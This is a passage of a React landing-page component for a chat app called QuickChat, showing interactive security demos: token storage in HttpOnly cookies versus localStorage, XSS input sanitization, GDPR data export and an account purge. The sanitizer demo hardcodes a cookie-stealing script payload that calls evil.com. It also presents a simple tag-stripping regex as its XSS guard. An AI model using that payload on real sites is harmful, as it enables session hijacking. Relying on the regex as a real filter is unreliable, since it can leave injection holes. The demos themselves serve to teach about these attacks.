                  ? "bg-emerald-600/15 border-emerald-500/40 shadow-lg shadow-emerald-600/5 text-white"
                  : "bg-slate-900/30 border-slate-800/80 text-slate-400 hover:bg-slate-900/50 hover:text-slate-200"
                  }`}
              >
                <div className="flex items-center gap-3 font-bold text-sm md:text-base">
                  <span className="p-2 rounded-lg bg-teal-500/10 text-teal-400">
                    <Download className="w-5 h-5" />
                  </span>
                  Data Portability
                </div>
                <p className="text-xs text-slate-400 leading-relaxed pl-11">
                  Guarantee users full data control with interactive instant downloads of chat logs in standardized JSON.
                </p>
              </button>

              <button
                onClick={() => setActiveSecurityTab("purge")}
                className={`w-full text-left p-5 rounded-2xl border transition-all duration-300 flex flex-col gap-2 cursor-pointer ${activeSecurityTab === "purge"
                  ? "bg-emerald-600/15 border-emerald-500/40 shadow-lg shadow-emerald-600/5 text-white"
                  : "bg-slate-900/30 border-slate-800/80 text-slate-400 hover:bg-slate-900/50 hover:text-slate-200"
                  }`}
              >
                <div className="flex items-center gap-3 font-bold text-sm md:text-base">
                  <span className="p-2 rounded-lg bg-pink-500/10 text-pink-400">
                    <Trash2 className="w-5 h-5" />
                  </span>
                  Safe Account Purge
                </div>
                <p className="text-xs text-slate-400 leading-relaxed pl-11">
                  Execute total GDPR-compliant data wipes, removing associated tables in clean cascades.
                </p>
              </button>
            </div>

            {/* Right Column: Display Demo Canvas */}
            <div className="lg:col-span-8 border border-slate-800/80 bg-slate-900/30 rounded-3xl p-6 md:p-8 flex flex-col justify-between min-h-[440px] backdrop-blur-md relative overflow-hidden">
              <div className="absolute top-0 right-0 w-64 h-64 bg-emerald-600/5 rounded-full blur-3xl pointer-events-none" />

              {/* --- HttpOnly JWT Auth VIEW --- */}
              {activeSecurityTab === "jwt" && (
                <div className="flex-1 flex flex-col justify-between h-full animate-fadeIn text-left">
                  <div>
                    <div className="flex items-center justify-between border-b border-slate-800/80 pb-4 mb-4">
                      <div className="flex items-center gap-2">
                        <Cookie className="w-4 h-4 text-emerald-400 animate-pulse" />
                        <span className="font-bold text-sm text-slate-300">Session Storage Exploit Simulator</span>
                      </div>
                      <span className="text-xs text-slate-500">Credential Isolation</span>
                    </div>

                    <div className="space-y-4">
                      <p className="text-xs text-slate-300 leading-relaxed">
                        Storing access tokens inside `localStorage` exposes them to Cross-Site Scripting (XSS) scripts. QuickChat locks tokens inside secure, server-signed <strong>HttpOnly cookies</strong> which browser scripts are blocked from reading.
                      </p>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        {/* Storage A */}
                        <div className="p-4 rounded-xl border border-slate-800 bg-slate-950/60 relative">
                          <div className="text-xs font-bold text-slate-400 mb-2 uppercase tracking-wide">Option A: LocalStorage</div>
                          <div className="font-mono text-[10px] text-pink-400 bg-pink-950/20 border border-pink-500/10 p-2.5 rounded-md mb-2 overflow-x-auto">
                            localStorage.token = "eyJhbGciOiJIUzI1NiIsInR5cCI6..."
                          </div>
                        </div>

                        {/* Storage B */}
                        <div className="p-4 rounded-xl border border-slate-800 bg-slate-950/60 relative">
                          <div className="text-xs font-bold text-slate-400 mb-2 uppercase tracking-wide">Option B: HttpOnly Cookie</div>
                          <div className="font-mono text-[10px] text-emerald-400 bg-emerald-950/20 border border-emerald-500/10 p-2.5 rounded-md mb-2 overflow-x-auto">
                            Cookie: token=eyJhbGci...; HttpOnly; Secure
                          </div>
                        </div>
                      </div>

                      {jwtSimState === "stolen" && (
                        <div className="bg-pink-500/10 border border-pink-500/30 rounded-xl p-4 flex gap-3 items-start animate-fadeIn">
                          <AlertTriangle className="w-5 h-5 text-pink-400 flex-shrink-0 mt-0.5" />
                          <div className="text-xs text-slate-300 leading-relaxed">
                            <span className="font-bold text-pink-400">XSS Exploit Successful:</span> Stole token via hacker payload: <code className="text-pink-300 bg-slate-900 px-1 py-0.5 rounded font-mono">localStorage.getItem('token')</code>. Attacker has hijacked user session!
                          </div>
                        </div>
                      )}

                      {jwtSimState === "secured" && (
                        <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-4 flex gap-3 items-start animate-fadeIn">
                          <Check className="w-5 h-5 text-emerald-400 flex-shrink-0 mt-0.5" />
                          <div className="text-xs text-slate-300 leading-relaxed">
                            <span className="font-bold text-emerald-400">XSS Intercepted:</span> Script command <code className="text-emerald-300 bg-slate-900 px-1 py-0.5 rounded font-mono">document.cookie</code> returned empty string. Browser security sandbox prevented script access to HttpOnly flags!
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="mt-6 flex gap-3 border-t border-slate-800/80 pt-4 justify-end">
                    <button
                      onClick={() => {
                        setJwtSimState("stolen");
                        setHackerMessage("LocalStorage token leaked.");
                      }}
                      className="bg-pink-950/40 hover:bg-pink-900/40 border border-pink-500/20 hover:border-pink-500/40 text-pink-300 transition-colors text-xs font-bold px-4 py-2.5 rounded-lg cursor-pointer"
                    >
                      Attack LocalStorage
                    </button>
                    <button
                      onClick={() => {
                        setJwtSimState("secured");
                        setHackerMessage("HttpOnly isolation protected credential.");
                      }}
                      className="bg-emerald-600 hover:bg-emerald-500 transition-all font-bold text-xs text-white px-5 py-2.5 rounded-lg shadow-lg shadow-emerald-600/20 cursor-pointer"
                    >
                      Attack HttpOnly Cookie
                    </button>
                  </div>
                </div>
              )}

              {/* --- Toxicity & XSS Sanitizer VIEW --- */}
              {activeSecurityTab === "firewall" && (
                <div className="flex-1 flex flex-col justify-between h-full animate-fadeIn text-left">
                  <div>
                    <div className="flex items-center justify-between border-b border-slate-800/80 pb-4 mb-4">
                      <div className="flex items-center gap-2">
                        <Server className="w-4 h-4 text-indigo-400" />
                        <span className="font-bold text-sm text-slate-300">Express Input sanitization simulation</span>
                      </div>
                      <span className="text-xs text-slate-500">Cross-Site Scripting Guard</span>
                    </div>

                    <div className="space-y-4">
                      <p className="text-xs text-slate-300 leading-relaxed">
                        To prevent script injection exploits, backend routes inspect body payloads and run regular expression filters to strip raw tags before inserting strings into MongoDB collections.
                      </p>

                      <div className="flex flex-col gap-2">
                        <label className="text-xs font-bold text-slate-400">Incoming API Payload String</label>
                        <input
                          type="text"
                          value={sanitizedInput}
                          onChange={(e) => {
                            setSanitizedInput(e.target.value);
                            setSanitizedActive(false);
                          }}
                          className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-xs text-slate-300 font-mono focus:outline-none focus:border-indigo-500"
                        />
                      </div>

                      {sanitizedActive && (
                        <div className="space-y-2 animate-fadeIn">
                          <div className="text-xs font-bold text-slate-400">Sanitized DB Document Entry</div>
                          <div className="font-mono text-xs text-emerald-400 bg-slate-950 border border-slate-800 p-3 rounded-xl flex items-center justify-between font-bold">
                            <span>{sanitizedOutput || "« Empty String »"}</span>
                            <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2 py-0.5 rounded-full font-bold uppercase tracking-wider font-sans">Sanitized</span>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="mt-6 flex gap-3 border-t border-slate-800/80 pt-4 justify-end">
                    <button
                      onClick={() => {
                        setSanitizedInput("<script>fetch('http://evil.com/steal?c=' + document.cookie)</script>");
                        setSanitizedActive(false);
                      }}
                      className="bg-slate-800 hover:bg-slate-700 transition-colors text-xs font-bold px-4 py-2.5 rounded-lg text-slate-300 cursor-pointer"
                    >
                      Reset Script Payload
                    </button>
                    <button
                      onClick={() => {
                        const clean = sanitizedInput.replace(/<\/?[^>]+(>|$)/g, "");
                        setSanitizedOutput(clean);
                        setSanitizedActive(true);
                      }}
                      className="bg-indigo-600 hover:bg-indigo-500 transition-all font-bold text-xs text-white px-5 py-2.5 rounded-lg shadow-lg shadow-indigo-600/20 cursor-pointer"
                    >
                      Sanitize Input Payload
                    </button>
                  </div>
                </div>
              )}

              {/* --- Data Portability VIEW --- */}
              {activeSecurityTab === "portability" && (
                <div className="flex-1 flex flex-col justify-between h-full animate-fadeIn text-left">
                  <div>
                    <div className="flex items-center justify-between border-b border-slate-800/80 pb-4 mb-4">
                      <div className="flex items-center gap-2">
                        <Download className="w-4 h-4 text-teal-400" />
                        <span className="font-bold text-sm text-slate-300">GDPR Data Export Tool</span>
                      </div>
                      <span className="text-xs text-slate-500">JSON Archive Download</span>
                    </div>

                    <div className="space-y-4">
                      <p className="text-xs text-slate-300 leading-relaxed">
                        Under GDPR Article 20, users are entitled to download all personal records. Clicking below calls the MongoDB backup pipe, bundles logs into a formatted JSON document, and initiates browser file download.
                      </p>

                      {exportState === "exporting" && (
                        <div className="h-32 flex flex-col items-center justify-center gap-2">
                          <RefreshCw className="w-6 h-6 text-teal-400 animate-spin" />
                          <span className="text-xs text-slate-400 animate-pulse font-medium">Bundling workspace chat logs & call analytics schema...</span>
                        </div>
                      )}

                      {exportState === "done" && (
                        <div className="space-y-2 animate-fadeIn">
                          <div className="flex items-center justify-between">
                            <span className="text-[10px] font-bold text-slate-500 uppercase">quickchat-export-2026.json</span>
                            <span className="text-[10px] text-teal-400 bg-teal-500/10 border border-teal-500/20 px-2 py-0.5 rounded-full font-bold uppercase">Export Ready</span>
                          </div>
                          <pre className="font-mono text-[10px] text-teal-300 bg-slate-950 border border-slate-800 p-3 rounded-xl max-h-[140px] overflow-y-auto leading-relaxed">
                            {`{
  "user": {
    "username": "DevanshParashar",
    "email": "devansh@example.com"
  },
  "messages": [
    { "id": "m_1", "text": "Raising connection pool size to 250.", "time": "2026-07-28T14:40" },
    { "id": "m_2", "text": "Awesome. Staging deployment done.", "time": "2026-07-28T14:41" }
  ],
  "calls": [
    { "id": "c_9", "durationSeconds": 312, "type": "video", "status": "completed" }
  ]
}`}
                          </pre>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="mt-6 flex gap-3 border-t border-slate-800/80 pt-4 justify-end">
                    {exportState === "done" && (
                      <button
                        onClick={() => setExportState("idle")}
                        className="bg-slate-800 hover:bg-slate-700 transition-colors text-xs font-bold px-4 py-2.5 rounded-lg text-slate-300 cursor-pointer"
                      >
                        Reset Demo
                      </button>
                    )}
                    <button
                      onClick={() => {
                        setExportState("exporting");
                        setTimeout(() => {
                          setExportState("done");
                          const mockData = {
                            user: { username: "DevanshParashar", email: "devansh@example.com" },
                            messages: [
                              { id: "m_1", text: "Raising connection pool size to 250.", time: "2026-07-28T14:40" },
                              { id: "m_2", text: "Awesome. Staging deployment done.", time: "2026-07-28T14:41" }
                            ],
                            calls: [
                              { id: "c_9", durationSeconds: 312, type: "video", status: "completed" }
                            ]
                          };
                          const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(mockData, null, 2));
                          const downloadAnchor = document.createElement('a');
                          downloadAnchor.setAttribute("href", dataStr);
                          downloadAnchor.setAttribute("download", "quickchat-export-simulated.json");
                          document.body.appendChild(downloadAnchor);
                          downloadAnchor.click();
                          downloadAnchor.remove();
                        }, 1200);
                      }}
                      disabled={exportState === "exporting"}
                      className="bg-teal-600 hover:bg-teal-500 disabled:bg-teal-800 transition-all font-bold text-xs text-white px-5 py-2.5 rounded-lg shadow-lg shadow-teal-600/20 cursor-pointer flex items-center gap-1.5"
                    >
                      <Download className="w-3.5 h-3.5" /> Download Chat Logs (JSON)
                    </button>
                  </div>
                </div>
              )}

              {/* --- Safe Account Purge VIEW --- */}
              {activeSecurityTab === "purge" && (
                <div className="flex-1 flex flex-col justify-between h-full animate-fadeIn text-left">
                  <div>
                    <div className="flex items-center justify-between border-b border-slate-800/80 pb-4 mb-4">
                      <div className="flex items-center gap-2">
                        <Trash2 className="w-4 h-4 text-pink-500" />
                        <span className="font-bold text-sm text-slate-300">GDPR Erasure (Right to be Forgotten) Simulator</span>
                      </div>
                      <span className="text-xs text-slate-500">Mongoose Cascade Wipe</span>
                    </div>

                    <div className="space-y-4">
                      <p className="text-xs text-slate-300 leading-relaxed">
                        Deleting your profile triggers cascading database wipes inside MongoDB: first purging user authentication metadata, then recursively removing associated messages, workspace references, and media keys.
                      </p>

                      <div className="space-y-2 font-mono text-[10px]">
                        <div className="flex justify-between p-2 rounded border border-slate-800 bg-slate-950/60">
                          <span className="text-slate-400">1. Collection: Users (ID: u_102)</span>
                          <span className={`font-bold ${purgeStep === "deleting_user" ? "text-pink-400 animate-pulse" : purgeStep === "deleting_messages" || purgeStep === "deleting_calls" || purgeStep === "completed" ? "text-slate-500 line-through" : "text-emerald-400"}`}>
                            {purgeStep === "idle" ? "ACTIVE" : purgeStep === "deleting_user" ? "DELETING..." : "PURGED"}
                          </span>
                        </div>
                        <div className="flex justify-between p-2 rounded border border-slate-800 bg-slate-950/60">
                          <span className="text-slate-400">2. Collection: Messages (Where sender_id: u_102)</span>
                          <span className={`font-bold ${purgeStep === "deleting_messages" ? "text-pink-400 animate-pulse" : purgeStep === "deleting_calls" || purgeStep === "completed" ? "text-slate-500 line-through" : purgeStep === "idle" ? "text-emerald-400" : "WAITING"}`}>
                            {purgeStep === "idle" ? "142 RECORDS ACTIVE" : purgeStep === "deleting_user" ? "WAITING" : purgeStep === "deleting_messages" ? "PURGING..." : "PURGED"}
                          </span>
                        </div>
                        <div className="flex justify-between p-2 rounded border border-slate-800 bg-slate-950/60">
                          <span className="text-slate-400">3. Collection: Call logs (Where particip_id: u_102)</span>
                          <span className={`font-bold ${purgeStep === "deleting_calls" ? "text-pink-400 animate-pulse" : purgeStep === "completed" ? "text-slate-500 line-through" : "text-emerald-400"}`}>
                            {purgeStep === "idle" ? "9 CALLS ACTIVE" : purgeStep === "completed" ? "PURGED" : purgeStep === "deleting_calls" ? "PURGING..." : "WAITING"}
                          </span>
                        </div>
                      </div>

                      {purgeStep === "completed" && (
                        <div className="bg-pink-500/10 border border-pink-500/30 rounded-xl p-4 flex gap-3 items-start animate-fadeIn">
                          <Check className="w-5 h-5 text-pink-400 flex-shrink-0 mt-0.5" />
                          <div className="text-xs text-slate-300">
                            <span className="font-bold text-pink-400 uppercase tracking-wider block mb-1">Database Cascade Complete</span>
                            All database collections wiped. User auth credentials, message threads, and WebRTC call metadata successfully purged from the systems permanently.
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="mt-6 flex gap-3 border-t border-slate-800/80 pt-4 justify-end">
                    <button
                      onClick={() => setPurgeStep("idle")}
                      className="bg-slate-800 hover:bg-slate-700 transition-colors text-xs font-bold px-4 py-2.5 rounded-lg text-slate-300 cursor-pointer"
                    >
                      Reset Purge
                    </button>
                    <button
                      onClick={() => {
                        setPurgeStep("deleting_user");
                        setTimeout(() => {
                          setPurgeStep("deleting_messages");
                          setTimeout(() => {
                            setPurgeStep("deleting_calls");
                            setTimeout(() => {
                              setPurgeStep("completed");
                            }, 1000);
                          }, 1000);
                        }, 1000);
                      }}
                      disabled={purgeStep !== "idle"}
                      className="bg-pink-600 hover:bg-pink-500 disabled:bg-pink-800 transition-all font-bold text-xs text-white px-5 py-2.5 rounded-lg shadow-lg shadow-pink-600/20 cursor-pointer"
                    >
                      {purgeStep === "idle" ? "Execute GDPR Purge" : "Purging schemas..."}
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="border-t border-slate-900 bg-slate-950/80 py-12 px-6 mt-auto">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-6 text-sm text-slate-500">
          <div className="flex items-center gap-2">
            <div className="w-7 h-7 rounded-md bg-indigo-600 flex items-center justify-center font-bold text-white">
              Q
            </div>
            <span className="font-bold text-slate-300">QuickChat</span>
          </div>
          <p>© 2026 QuickChat Inc. Made for recruiters who value technical excellence.</p>
        </div>
      </footer>
    </div>
  );
};
export default LandingPage;
